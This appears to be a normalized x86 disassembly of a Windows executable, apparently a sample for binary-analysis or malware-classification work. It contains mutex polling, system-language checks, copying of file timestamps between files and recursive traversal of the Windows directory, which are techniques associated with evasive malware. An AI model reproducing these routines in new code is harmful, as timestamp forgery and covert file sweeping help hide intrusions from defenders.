mov [ esp + 0x24 ] bx
mov [ esp + 0x26 ] 0x11
mov [ esp + 0x28 ] rw-data
mov [ esp + 0x2c ] bx
mov [ esp + 0x2e ] ax
mov [ esp + 0x30 ] rw-data
mov [ esp + 0x34 ] cx
mov [ esp + 0x36 ] ax
mov [ esp + 0x38 ] rw-data
mov [ esp + 0x3c ] bp
mov [ esp + 0x3e ] ax
mov [ esp + 0x40 ] rw-data
mov [ esp + 0x44 ] dx
mov [ esp + 0x46 ] ax
mov [ esp + 0x48 ] rw-data
mov [ esp + 0x4c ] di
mov [ esp + 0x4e ] ax
mov [ esp + 0x50 ] rw-data
mov [ esp + 0x54 ] si
mov [ esp + 0x56 ] ax
mov [ esp + 0x58 ] rw-data
mov [ esp + 0x5c ] 0x7
mov [ esp + 0x5e ] ax
mov [ esp + 0x60 ] rw-data
mov [ esp + 0x64 ] 0x8
mov [ esp + 0x66 ] ax
mov [ esp + 0x68 ] rw-data
mov [ esp + 0x6c ] 0x9
mov [ esp + 0x6e ] ax
mov [ esp + 0x70 ] rw-data
mov [ esp + 0x74 ] 0xa
mov [ esp + 0x76 ] ax
mov [ esp + 0x78 ] rw-data
mov [ esp + 0x7c ] 0xb
mov [ esp + 0x7e ] ax
mov [ esp + 0x80 ] rw-data
mov [ esp + 0x84 ] 0xc
mov [ esp + 0x86 ] ax
mov [ esp + 0x88 ] rw-data
mov [ esp + 0x8c ] 0xd
mov [ esp + 0x8e ] ax
mov [ esp + 0x90 ] rw-data
mov [ esp + 0x94 ] 0xe
mov [ esp + 0x96 ] ax
mov [ esp + 0x98 ] rw-data
mov [ esp + 0x9c ] 0xf
mov [ esp + 0x9e ] ax
mov [ esp + 0xa0 ] rw-data
mov [ esp + 0xa4 ] 0x10
mov [ esp + 0xa6 ] ax
mov [ esp + 0xa8 ] rw-data
mov [ esp + 0xac ] 0x2b
mov [ esp + 0xae ] bx
mov [ esp + 0xb0 ] rw-data
mov [ esp + 0xb4 ] 0x4d
mov [ esp + 0xb6 ] bx
mov [ esp + 0xb8 ] rw-data
mov [ esp + 0xbc ] 0x2c
mov [ esp + 0xbe ] bp
mov [ esp + 0xc0 ] rw-data
mov [ esp + 0xc4 ] bx
mov [ esp + 0xc6 ] ax
mov [ esp + 0xc8 ] rw-data
mov [ esp + 0xcc ] cx
mov [ esp + 0xce ] ax
mov [ esp + 0xd0 ] rw-data
mov [ esp + 0xd4 ] 0x2d
mov [ esp + 0xd6 ] bx
mov [ esp + 0xd8 ] rw-data
mov [ esp + 0xdc ] 0x23
mov [ esp + 0xde ] bx
mov [ esp + 0xe0 ] rw-data
mov [ esp + 0xe4 ] 0x45
mov [ esp + 0xe6 ] bx
mov [ esp + 0xe8 ] rw-data
mov [ esp + 0xec ] cx
mov [ esp + 0xee ] bx
mov [ esp + 0xf0 ] rw-data
mov [ esp + 0xf4 ] bp
mov [ esp + 0xf6 ] bx
mov [ esp + 0xf8 ] rw-data
mov [ esp + 0xfc ] dx
mov [ esp + 0xfe ] si
mov [ esp + 0x100 ] rw-data
mov [ esp + 0x104 ] bx
mov [ esp + 0x106 ] ax
mov [ esp + 0x108 ] rw-data
mov [ esp + 0x10c ] cx
mov [ esp + 0x10e ] ax
mov [ esp + 0x110 ] rw-data
mov [ esp + 0x114 ] bp
mov [ esp + 0x116 ] ax
mov [ esp + 0x118 ] rw-data
mov [ esp + 0x11c ] dx
mov [ esp + 0x11e ] ax
mov [ esp + 0x120 ] rw-data
mov [ esp + 0x124 ] di
mov [ esp + 0x126 ] ax
mov [ esp + 0x128 ] rw-data
mov [ esp + 0x12c ] di
mov [ esp + 0x12e ] bx
mov [ esp + 0x130 ] rw-data
mov [ esp + 0x134 ] si
mov [ esp + 0x136 ] bx
mov [ esp + 0x138 ] rw-data
mov [ esp + 0x13c ] 0x13
mov [ esp + 0x13e ] bp
mov [ esp + 0x140 ] rw-data
mov [ esp + 0x144 ] bx
mov [ esp + 0x146 ] ax
mov [ esp + 0x148 ] rw-data
mov [ esp + 0x14c ] cx
mov [ esp + 0x14e ] ax
mov [ esp + 0x150 ] rw-data
mov [ esp + 0x154 ] 0x9
mov [ esp + 0x156 ] 0xe
mov [ esp + 0x158 ] rw-data
mov [ esp + 0x15c ] bx
mov [ esp + 0x15e ] ax
mov [ esp + 0x160 ] rw-data
mov [ esp + 0x164 ] cx
mov [ esp + 0x166 ] ax
mov [ esp + 0x168 ] rw-data
mov [ esp + 0x16c ] bp
mov [ esp + 0x16e ] ax
mov [ esp + 0x170 ] rw-data
mov [ esp + 0x174 ] dx
mov [ esp + 0x176 ] ax
mov [ esp + 0x178 ] rw-data
mov [ esp + 0x17c ] di
mov [ esp + 0x17e ] ax
mov [ esp + 0x180 ] rw-data
mov [ esp + 0x184 ] si
mov [ esp + 0x186 ] ax
mov [ esp + 0x188 ] rw-data
mov [ esp + 0x18c ] 0x7
mov [ esp + 0x18e ] ax
mov [ esp + 0x190 ] rw-data
mov [ esp + 0x194 ] 0x8
mov [ esp + 0x196 ] ax
mov [ esp + 0x198 ] rw-data
mov [ esp + 0x19c ] 0x9
mov [ esp + 0x19e ] ax
mov [ esp + 0x1a0 ] rw-data
mov [ esp + 0x1a4 ] 0xa
mov [ esp + 0x1a6 ] ax
mov [ esp + 0x1a8 ] rw-data
mov [ esp + 0x1ac ] 0xb
mov [ esp + 0x1ae ] ax
mov [ esp + 0x1b0 ] rw-data
mov [ esp + 0x1b4 ] 0xc
mov [ esp + 0x1b6 ] ax
mov [ esp + 0x1b8 ] rw-data
mov [ esp + 0x1bc ] 0xd
mov [ esp + 0x1be ] ax
mov [ esp + 0x1c0 ] rw-data
mov [ esp + 0x1c4 ] 0x25
mov [ esp + 0x1c6 ] bx
mov [ esp + 0x1c8 ] rw-data
mov [ esp + 0x1cc ] 0x38
mov [ esp + 0x1ce ] bx
mov [ esp + 0x1d0 ] rw-data
mov [ esp + 0x1d4 ] 0x29
mov [ esp + 0x1d6 ] bx
mov [ esp + 0x1d8 ] rw-data
mov [ esp + 0x1dc ] 0xb
mov [ esp + 0x1de ] bx
mov [ esp + 0x1e0 ] rw-data
mov [ esp + 0x1e4 ] 0xc
mov [ esp + 0x1e6 ] 0x7
mov [ esp + 0x1e8 ] rw-data
mov [ esp + 0x1ec ] bx
mov [ esp + 0x1ee ] ax
mov [ esp + 0x1f0 ] rw-data
mov [ esp + 0x1f4 ] cx
mov [ esp + 0x1f6 ] ax
mov [ esp + 0x1f8 ] rw-data
mov [ esp + 0x1fc ] bp
mov [ esp + 0x1fe ] ax
mov [ esp + 0x200 ] rw-data
mov [ esp + 0x204 ] dx
mov [ esp + 0x206 ] ax
mov [ esp + 0x208 ] rw-data
mov [ esp + 0x20c ] di
mov [ esp + 0x20e ] ax
mov [ esp + 0x210 ] rw-data
mov [ esp + 0x214 ] si
mov [ esp + 0x216 ] ax
mov [ esp + 0x218 ] rw-data
mov [ esp + 0x21c ] 0x37
mov [ esp + 0x21e ] bx
mov [ esp + 0x220 ] rw-data
mov [ esp + 0x224 ] 0x7
mov [ esp + 0x226 ] si
mov [ esp + 0x228 ] rw-data
mov [ esp + 0x22c ] bx
mov [ esp + 0x22e ] ax
mov [ esp + 0x230 ] rw-data
mov [ esp + 0x234 ] cx
mov [ esp + 0x236 ] ax
mov [ esp + 0x238 ] rw-data
mov [ esp + 0x23c ] bp
mov [ esp + 0x23e ] ax
mov [ esp + 0x240 ] rw-data
mov [ esp + 0x244 ] dx
mov [ esp + 0x246 ] ax
mov [ esp + 0x248 ] rw-data
mov [ esp + 0x24c ] di
mov [ esp + 0x24e ] ax
mov [ esp + 0x250 ] rw-data
mov [ esp + 0x254 ] 0x8
mov [ esp + 0x256 ] bx
mov [ esp + 0x258 ] rw-data
mov [ esp + 0x25c ] 0x47
mov [ esp + 0x25e ] bx
mov [ esp + 0x260 ] rw-data
mov [ esp + 0x264 ] 0xd
mov [ esp + 0x266 ] bx
mov [ esp + 0x268 ] rw-data
mov [ esp + 0x26c ] 0x39
mov [ esp + 0x26e ] bx
mov [ esp + 0x270 ] rw-data
mov [ esp + 0x274 ] 0xe
mov [ esp + 0x276 ] bx
mov [ esp + 0x278 ] rw-data
mov [ esp + 0x27c ] 0xf
mov [ esp + 0x27e ] bx
mov [ esp + 0x280 ] rw-data
mov [ esp + 0x284 ] 0x21
mov [ esp + 0x286 ] bx
mov [ esp + 0x288 ] rw-data
mov [ esp + 0x28c ] 0x10
mov [ esp + 0x28e ] bp
mov [ esp + 0x290 ] rw-data
mov [ esp + 0x294 ] bx
mov [ esp + 0x296 ] ax
mov [ esp + 0x298 ] rw-data
mov [ esp + 0x29c ] cx
mov [ esp + 0x29e ] ax
mov [ esp + 0x2a0 ] rw-data
mov [ esp + 0x2a4 ] 0x11
mov [ esp + 0x2a6 ] bx
mov [ esp + 0x2a8 ] rw-data
mov [ esp + 0x2ac ] 0x4b
mov [ esp + 0x2ae ] bx
mov [ esp + 0x2b0 ] rw-data
mov [ esp + 0x2b4 ] 0x57
mov [ esp + 0x2b6 ] bx
mov [ esp + 0x2b8 ] rw-data
mov [ esp + 0x2bc ] 0x12
mov [ esp + 0x2be ] cx
mov [ esp + 0x2c0 ] rw-data
mov [ esp + 0x2c4 ] bx
mov [ esp + 0x2c6 ] ax
mov [ esp + 0x2c8 ] rw-data
mov [ esp + 0x2cc ] 0x60
mov [ esp + 0x2ce ] bp
mov [ esp + 0x2d0 ] rw-data
mov [ esp + 0x2d4 ] bx
mov [ esp + 0x2d6 ] ax
mov [ esp + 0x2d8 ] rw-data
mov [ esp + 0x2dc ] cx
mov [ esp + 0x2de ] ax
mov [ esp + 0x2e0 ] rw-data
mov [ esp + 0x2e4 ] 0x3f
mov [ esp + 0x2e6 ] bx
mov [ esp + 0x2e8 ] rw-data
mov [ esp + 0x2ec ] 0x26
mov [ esp + 0x2ee ] bx
mov [ esp + 0x2f0 ] rw-data
mov [ esp + 0x2f4 ] 0x27
mov [ esp + 0x2f6 ] bp
mov [ esp + 0x2f8 ] rw-data
mov [ esp + 0x2fc ] bx
mov [ esp + 0x2fe ] ax
mov [ esp + 0x300 ] rw-data
mov [ esp + 0x304 ] cx
mov [ esp + 0x306 ] ax
mov [ esp + 0x308 ] rw-data
mov [ esp + 0x30c ] 0x2f
mov [ esp + 0x30e ] bx
mov [ esp + 0x310 ] rw-data
mov [ esp + 0x314 ] 0x3e
mov [ esp + 0x316 ] bp
mov [ esp + 0x318 ] rw-data
mov [ esp + 0x31c ] bx
mov [ esp + 0x31e ] ax
mov [ esp + 0x320 ] rw-data
mov [ esp + 0x324 ] cx
mov [ esp + 0x326 ] ax
mov [ esp + 0x328 ] rw-data
mov [ esp + 0x32c ] 0x4c
mov [ esp + 0x32e ] bx
mov [ esp + 0x330 ] rw-data
mov [ esp + 0x334 ] 0x58
mov [ esp + 0x336 ] bx
mov [ esp + 0x338 ] rw-data
mov [ esp + 0x33c ] 0x4e
mov [ esp + 0x33e ] bx
mov [ esp + 0x340 ] rw-data
mov [ esp + 0x344 ] 0x61
mov [ esp + 0x346 ] bp
mov [ esp + 0x348 ] rw-data
mov [ esp + 0x34c ] bx
mov [ esp + 0x34e ] ax
mov [ esp + 0x350 ] rw-data
mov [ esp + 0x354 ] cx
mov [ esp + 0x356 ] ax
mov [ esp + 0x358 ] rw-data
mov [ esp + 0x35c ] ax
mov [ esp + 0x35e ] dx
mov [ esp + 0x360 ] rw-data
mov [ esp + 0x364 ] ax
mov [ esp + 0x366 ] ax
mov [ esp + 0x368 ] rw-data
mov [ esp + 0x36c ] bx
mov [ esp + 0x36e ] ax
mov [ esp + 0x370 ] rw-data
mov [ esp + 0x374 ] cx
mov [ esp + 0x376 ] ax
mov [ esp + 0x378 ] rw-data
mov [ esp + 0x37c ] 0x14
mov [ esp + 0x37e ] bp
mov [ esp + 0x380 ] rw-data
mov [ esp + 0x384 ] bx
mov [ esp + 0x386 ] ax
mov [ esp + 0x388 ] rw-data
mov [ esp + 0x38c ] cx
mov [ esp + 0x38e ] ax
mov [ esp + 0x390 ] rw-data
mov [ esp + 0x394 ] 0x48
mov [ esp + 0x396 ] bx
mov [ esp + 0x398 ] rw-data
mov [ esp + 0x39c ] 0x15
mov [ esp + 0x39e ] bx
mov [ esp + 0x3a0 ] rw-data
mov [ esp + 0x3a4 ] 0x16
mov [ esp + 0x3a6 ] bp
mov [ esp + 0x3a8 ] rw-data
mov [ esp + 0x3ac ] bx
mov [ esp + 0x3ae ] ax
mov [ esp + 0x3b0 ] rw-data
mov [ esp + 0x3b4 ] cx
mov [ esp + 0x3b6 ] ax
mov [ esp + 0x3b8 ] rw-data
mov [ esp + 0x3bc ] 0x46
mov [ esp + 0x3be ] bx
mov [ esp + 0x3c0 ] rw-data
mov [ esp + 0x3c4 ] 0x18
mov [ esp + 0x3c6 ] bx
mov [ esp + 0x3c8 ] rw-data
mov [ esp + 0x3cc ] 0x19
mov [ esp + 0x3ce ] bx
mov [ esp + 0x3d0 ] rw-data
mov [ esp + 0x3d4 ] 0x4f
mov [ esp + 0x3d6 ] bx
mov [ esp + 0x3d8 ] rw-data
mov [ esp + 0x3dc ] 0x1a
mov [ esp + 0x3de ] dx
mov [ esp + 0x3e0 ] rw-data
mov [ esp + 0x3e4 ] bx
mov [ esp + 0x3e6 ] ax
mov [ esp + 0x3e8 ] rw-data
mov [ esp + 0x3ec ] cx
mov [ esp + 0x3ee ] ax
mov [ esp + 0x3f0 ] rw-data
mov [ esp + 0x3f4 ] bp
mov [ esp + 0x3f6 ] ax
mov [ esp + 0x3f8 ] rw-data
mov [ esp + 0x3fc ] 0x59
mov [ esp + 0x3fe ] bx
mov [ esp + 0x400 ] rw-data
mov [ esp + 0x404 ] 0x1b
mov [ esp + 0x406 ] bx
mov [ esp + 0x408 ] rw-data
mov [ esp + 0x40c ] 0x24
mov [ esp + 0x40e ] bx
mov [ esp + 0x410 ] rw-data
mov [ esp + 0x414 ] 0xa
mov [ esp + 0x416 ] 0x15
mov [ esp + 0x418 ] rw-data
mov [ esp + 0x41c ] bx
mov [ esp + 0x41e ] ax
mov [ esp + 0x420 ] rw-data
mov [ esp + 0x424 ] cx
mov [ esp + 0x426 ] ax
mov [ esp + 0x428 ] rw-data
mov [ esp + 0x42c ] bp
mov [ esp + 0x42e ] ax
mov [ esp + 0x430 ] rw-data
mov [ esp + 0x434 ] dx
mov [ esp + 0x436 ] ax
mov [ esp + 0x438 ] rw-data
mov [ esp + 0x43c ] di
mov [ esp + 0x43e ] ax
mov [ esp + 0x440 ] rw-data
mov [ esp + 0x444 ] si
mov [ esp + 0x446 ] ax
mov [ esp + 0x448 ] rw-data
mov [ esp + 0x44c ] 0x7
mov [ esp + 0x44e ] ax
mov [ esp + 0x450 ] rw-data
mov [ esp + 0x454 ] 0x8
mov [ esp + 0x456 ] ax
mov [ esp + 0x458 ] rw-data
mov [ esp + 0x45c ] 0x9
mov [ esp + 0x45e ] ax
mov [ esp + 0x460 ] rw-data
mov [ esp + 0x464 ] 0xa
mov [ esp + 0x466 ] ax
mov [ esp + 0x468 ] rw-data
mov [ esp + 0x46c ] 0xb
mov [ esp + 0x46e ] ax
mov [ esp + 0x470 ] rw-data
mov [ esp + 0x474 ] 0xc
mov [ esp + 0x476 ] ax
mov [ esp + 0x478 ] rw-data
mov [ esp + 0x47c ] 0xd
mov [ esp + 0x47e ] ax
mov [ esp + 0x480 ] rw-data
mov [ esp + 0x484 ] 0xe
mov [ esp + 0x486 ] ax
mov [ esp + 0x488 ] rw-data
mov [ esp + 0x48c ] 0xf
mov [ esp + 0x48e ] ax
mov [ esp + 0x490 ] rw-data
mov [ esp + 0x494 ] 0x10
mov [ esp + 0x496 ] ax
mov [ esp + 0x498 ] rw-data
mov [ esp + 0x49c ] 0x11
mov [ esp + 0x49e ] ax
mov [ esp + 0x4a0 ] rw-data
mov [ esp + 0x4a4 ] 0x12
mov [ esp + 0x4a6 ] ax
mov [ esp + 0x4a8 ] rw-data
mov [ esp + 0x4ac ] 0x13
mov [ esp + 0x4ae ] ax
mov [ esp + 0x4b0 ] rw-data
mov [ esp + 0x4b4 ] 0x14
mov [ esp + 0x4b6 ] ax
mov [ esp + 0x4b8 ] rw-data
mov [ esp + 0x4bc ] 0x41
mov [ esp + 0x4be ] bx
mov [ esp + 0x4c0 ] rw-data
mov [ esp + 0x4c4 ] 0x1d
mov [ esp + 0x4c6 ] bp
mov [ esp + 0x4c8 ] rw-data
mov [ esp + 0x4cc ] bx
mov [ esp + 0x4ce ] ax
mov [ esp + 0x4d0 ] rw-data
mov [ esp + 0x4d4 ] cx
mov [ esp + 0x4d6 ] ax
mov [ esp + 0x4d8 ] rw-data
mov [ esp + 0x4dc ] 0x49
mov [ esp + 0x4de ] bx
mov [ esp + 0x4e0 ] rw-data
mov [ esp + 0x4e4 ] 0x44
mov [ esp + 0x4e6 ] bx
mov [ esp + 0x4e8 ] rw-data
mov [ esp + 0x4ec ] 0x4a
mov [ esp + 0x4ee ] bx
mov [ esp + 0x4f0 ] rw-data
mov [ esp + 0x4f4 ] 0x1e
mov [ esp + 0x4f6 ] bx
mov [ esp + 0x4f8 ] rw-data
mov [ esp + 0x4fc ] 0x1f
mov [ esp + 0x4fe ] bx
mov [ esp + 0x500 ] rw-data
mov [ esp + 0x504 ] 0x22
xor esi esi
mov [ esp + 0x506 ] bx
mov [ esp + 0x508 ] rw-data
mov [ esp + 0x50c ] 0x20
mov [ esp + 0x50e ] bp
mov [ esp + 0x510 ] rw-data
mov [ esp + 0x514 ] bx
mov [ esp + 0x516 ] ax
mov [ esp + 0x518 ] rw-data
mov [ esp + 0x51c ] cx
mov [ esp + 0x51e ] ax
mov [ esp + 0x520 ] rw-data
mov [ esp + 0x524 ] 0x43
mov [ esp + 0x526 ] bp
mov [ esp + 0x528 ] rw-data
mov [ esp + 0x52c ] bx
mov [ esp + 0x52e ] ax
mov [ esp + 0x530 ] rw-data
mov [ esp + 0x534 ] cx
mov [ esp + 0x536 ] ax
mov [ esp + 0x538 ] rw-data
mov [ esp + 0x53c ] 0x2a
mov [ esp + 0x53e ] bx
mov [ esp + 0x540 ] rw-data
mov [ esp + 0x10 ] esi
call [ GetSystemDefaultLangID@IAT ]
mov cl al
and ecx 0xff
shr ax 0xa
mov edx eax
mov edi [ esp + esi * 8 + 0x18 ]
or ecx 0xffffffff
xor eax eax
mov [ esp + 0x10 ] esi
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi [ esp + 0x548 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
mov eax [ esp + 0x10 ]
and ecx ebp
cmp [ esp + eax * 8 + 0x16 ] bx
[ edi ] [ esi ]
je r-xdata
xor eax eax
mov ax [ esp + esi * 8 + 0x16 ]
add esi eax
cmp esi 0xa6
jl r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x534
retn
and edx 0xffff
or ecx 0xffffffff
add edx eax
xor eax eax
mov edi [ esp + edx * 8 + 0x18 ]
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edi [ esp + 0x548 ]
mov edx ecx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx ebp
[ edi ] [ esi ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0x534
retn
cmp [ esp + esi * 8 + 0x14 ] cx
je r-xdata
mov edi rw-data
or ecx 0xffffffff
xor eax eax
mov [ esp + 0x10 ] esi
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi [ esp + 0x548 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx ebp
[ edi ] [ esi ]
sub_405cc0
push ecx
push ebx
push ebp
push esi
mov esi [ OpenMutexA@IAT ]
push edi
mov edi [ CloseHandle@IAT ]
xor ebp ebp
xor ebx ebx
mov [ esp + 0x10 ] 0x77
test ebx ebx
jne r-xdata
push rw-data
push ebp
push 0x1f0001
call esi
test eax eax
je r-xdata
test ebp ebp
je r-xdata
push rw-data
push ebx
push 0x1f0001
call esi
test eax eax
je r-xdata
push eax
call edi
mov ebp 0x1
push 0x3e8
call [ Sleep@IAT ]
mov eax [ esp + 0x10 ]
mov ecx eax
dec eax
test ecx ecx
mov [ esp + 0x10 ] eax
jne r-xdata
test ebx ebx
jne r-xdata
push rw-data
push 0x0
push 0x1f0001
call esi
test eax eax
je r-xdata
push eax
call edi
mov ebx 0x1
test ebp ebp
jne r-xdata
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
pop ecx
retn
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
pop ecx
retn
push eax
call edi
mov ebx 0x1
sub_405d70
mov eax [ rw-data ]
sub esp 0x358
test eax eax
push esi
jne r-xdata
push rw-data
lea eax [ esp + 0x160 ]
push rw-data
push eax
call [ sprintf@IAT ]
add esp 0xc
lea ecx [ esp + 0x1c ]
lea edx [ esp + 0x15c ]
push ecx
push edx
call [ FindFirstFileA@IAT ]
mov esi eax
cmp esi 0xffffffff
je r-xdata
xor eax eax
pop esi
add esp 0x358
retn
mov eax 0x1
pop esi
add esp 0x358
retn
lea eax [ esp + 0xc ]
push eax
call [ GetSystemTime@IAT ]
lea ecx [ esp + 0x4 ]
lea edx [ esp + 0xc ]
push ecx
push edx
call [ SystemTimeToFileTime@IAT ]
mov eax [ esp + 0x4 ]
mov edx [ esp + 0x8 ]
add eax 0xd71bc000
lea ecx [ esp + 0x30 ]
mov [ esp + 0x4 ] eax
lea eax [ esp + 0x4 ]
adc edx 0xfffffa7f
push eax
push ecx
mov [ esp + 0x10 ] edx
call [ CompareFileTime@IAT ]
test eax eax
push esi
jle r-xdata
call [ FindClose@IAT ]
call [ FindClose@IAT ]
xor eax eax
pop esi
add esp 0x358
retn
sub_405e30
sub esp 0x10c
lea eax [ esp ]
push esi
push edi
push eax
call [ SHGetMalloc@IAT ]
mov esi eax
test esi esi
jl r-xdata
mov eax esi
pop edi
pop esi
add esp 0x10c
retn
mov edx [ esp + 0x120 ]
lea ecx [ esp + 0xc ]
push ecx
push edx
push 0x0
call [ SHGetSpecialFolderLocation@IAT ]
mov esi eax
test esi esi
jl r-xdata
mov eax [ esp + 0x8 ]
push eax
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov ecx [ esp + 0xc ]
lea eax [ esp + 0x10 ]
push eax
push ecx
call [ SHGetPathFromIDListA@IAT ]
test eax eax
je r-xdata
mov eax [ esp + 0x8 ]
mov edx [ esp + 0xc ]
push edx
push eax
mov ecx [ eax ]
call [ ecx + 0x14 ]
lea edi [ esp + 0x10 ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
lea edi [ esp + 0x10 ]
mov edx ecx
or ecx 0xffffffff
[ edi ]
mov eax [ esp + 0x11c ]
not ecx
cmp eax ecx
jae r-xdata
lea edi [ esp + 0x10 ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi [ esp + 0x118 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
mov eax edx
and ecx 0x3
[ edi ] [ esi ]
pop edi
pop esi
add esp 0x10c
retn
pop edi
lea eax [ edx + 0x1 ]
pop esi
add esp 0x10c
retn
sub_405f10
sub esp 0x18
mov eax [ esp + 0x1c ]
push esi
mov esi [ CreateFileA@IAT ]
push edi
push 0x0
push 0x2000000
push 0x3
push 0x0
push 0x5
push 0x80000000
push eax
call esi
mov edi eax
cmp edi 0xffffffff
je r-xdata
pop edi
pop esi
add esp 0x18
retn
mov ecx [ esp + 0x28 ]
push 0x0
push 0x80
push 0x3
push 0x0
push 0x0
push 0x40000000
push ecx
call esi
mov esi eax
cmp esi 0xffffffff
jne r-xdata
lea edx [ esp + 0x8 ]
lea eax [ esp + 0x10 ]
push edx
lea ecx [ esp + 0x1c ]
push eax
push ecx
push edi
call [ GetFileTime@IAT ]
lea edx [ esp + 0x8 ]
lea eax [ esp + 0x10 ]
push edx
lea ecx [ esp + 0x1c ]
push eax
push ecx
push esi
call [ SetFileTime@IAT ]
push edi
mov edi [ CloseHandle@IAT ]
call edi
push esi
call edi
push edi
call [ CloseHandle@IAT ]
pop edi
pop esi
add esp 0x18
retn
sub_405fb0
sub esp 0x640
lea eax [ esp + 0x140 ]
push esi
push edi
push 0x100
push eax
call [ GetWindowsDirectoryA@IAT ]
mov edi rw-data
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x14b ]
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
lea edx [ esp + 0x248 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov edi [ sprintf@IAT ]
lea ecx [ esp + 0x148 ]
push ecx
push rw-data
push edx
call edi
add esp 0xc
lea eax [ esp + 0x8 ]
lea ecx [ esp + 0x248 ]
push eax
push ecx
call [ FindFirstFileA@IAT ]
mov esi eax
cmp esi 0xffffffff
je r-xdata
pop edi
pop esi
add esp 0x640
retn
push ebp
mov ebp [ FindNextFileA@IAT ]
push esi
call [ FindClose@IAT ]
pop ebp
cmp [ esp + 0x38 ] 0x2e
je r-xdata
lea edx [ esp + 0xc ]
push edx
push esi
call ebp
test eax eax
je r-xdata
test [ esp + 0xc ] 0x10
je r-xdata
lea eax [ esp + 0x38 ]
push rw-data
lea ecx [ esp + 0x150 ]
push eax
push ecx
lea edx [ esp + 0x458 ]
push rw-data
push edx
call edi
lea eax [ esp + 0x460 ]
push eax
call sub_4060a0
add esp 0x18
jmp r-xdata
sub_4060a0
sub esp 0x540
lea eax [ esp + 0x340 ]
push ebp
push esi
mov esi [ esp + 0x54c ]
push edi
mov edi [ sprintf@IAT ]
push esi
push rw-data
push eax
call edi
add esp 0xc
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x34c ]
push ecx
push edx
call [ FindFirstFileA@IAT ]
mov ebp eax
cmp ebp 0xffffffff
je r-xdata
pop edi
pop esi
mov eax 0x1
pop ebp
add esp 0x540
retn
lea eax [ esp + 0xc ]
push eax
push ebp
call [ FindNextFileA@IAT ]
test eax eax
je r-xdata
push ebp
call [ FindClose@IAT ]
cmp [ esp + 0x38 ] 0x2e
je r-xdata
lea ecx [ esp + 0x38 ]
lea edx [ esp + 0x14c ]
push ecx
push esi
push rw-data
push edx
call edi
mov al [ esp + 0x1c ]
add esp 0x10
test al 0x10
je r-xdata
lea ecx [ esp + 0x38 ]
push ecx
call sub_4028a0
add esp 0x4
test eax eax
je r-xdata
lea eax [ esp + 0x14c ]
push eax
call sub_4060a0
add esp 0x4
test eax eax
je r-xdata
lea edx [ esp + 0x14c ]
push edx
call sub_402de0
add esp 0x4
jmp r-xdata
push ebp
call [ FindClose@IAT ]
pop edi
pop esi
xor eax eax
pop ebp
add esp 0x540
retn
jmp r-xdata
sub_4061a0
push ebp
mov ebp esp
sub esp 0x40
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x3c ] eax
mov ecx [ ebp + 0x14 ]
mov [ ebp - 0x38 ] ecx
mov edx [ ebp + 0x8 ]
mov [ ebp - 0x30 ] edx
mov eax [ ebp + 0xc ]
mov ecx [ eax ]
mov [ ebp - 0x2c ] ecx
mov edx [ ebp + 0xc ]
mov eax [ ebp - 0x2c ]
cmp eax [ edx ]
je r-xdata
mov [ ebp - 0x1c ] 0x0
mov [ ebp - 0x18 ] 0x0
mov [ ebp - 0x14 ] 0x0
push 0x38
push rw-data
mov ecx [ ebp + 0x18 ]
push ecx
lea edx [ ebp - 0x3c ]
push edx
call sub_406290
add esp 0x10
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax 0xfffffffb
jmp r-xdata
push 0x4
lea eax [ ebp - 0x3c ]
push eax
call sub_40692e
add esp 0x8
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
jmp r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0xc ]
mov ecx [ ebp - 0x28 ]
mov [ eax ] ecx
lea edx [ ebp - 0x3c ]
push edx
call sub_406dc5
add esp 0x4
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
lea ecx [ ebp - 0x3c ]
push ecx
call sub_406dc5
add esp 0x4
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov edx [ ebp - 0x4 ]
mov [ ebp - 0x40 ] edx
mov [ ebp - 0x40 ] 0xfffffffb
jmp r-xdata
mov eax [ ebp - 0x40 ]
jmp r-xdata
sub_406269
push ebp
mov ebp esp
push 0xffffffff
mov eax [ ebp + 0x14 ]
push eax
mov ecx [ ebp + 0x10 ]
push ecx
mov edx [ ebp + 0xc ]
push edx
mov eax [ ebp + 0x8 ]
push eax
call sub_4061a0
add esp 0x14
pop ebp
retn
sub_406290
push ebp
mov ebp esp
mov eax [ ebp + 0x14 ]
push eax
mov ecx [ ebp + 0x10 ]
push ecx
push 0x0
push 0x8
push 0xf
push 0x8
mov edx [ ebp + 0xc ]
push edx
mov eax [ ebp + 0x8 ]
push eax
call sub_4062b5
add esp 0x20
pop ebp
retn
sub_4062b5
push ebp
mov ebp esp
sub esp 0xc
mov [ ebp - 0xc ] 0x0
cmp [ ebp + 0x20 ] 0x0
je r-xdata
mov eax 0xfffffffa
jmp r-xdata
mov eax [ ebp + 0x20 ]
movsx ecx [ eax ]
mov edx [ rw-data ]
movsx eax [ edx ]
cmp ecx eax
jne r-xdata
mov esp ebp
pop ebp
retn
cmp [ ebp + 0x24 ] 0x38
je r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x18 ] 0x0
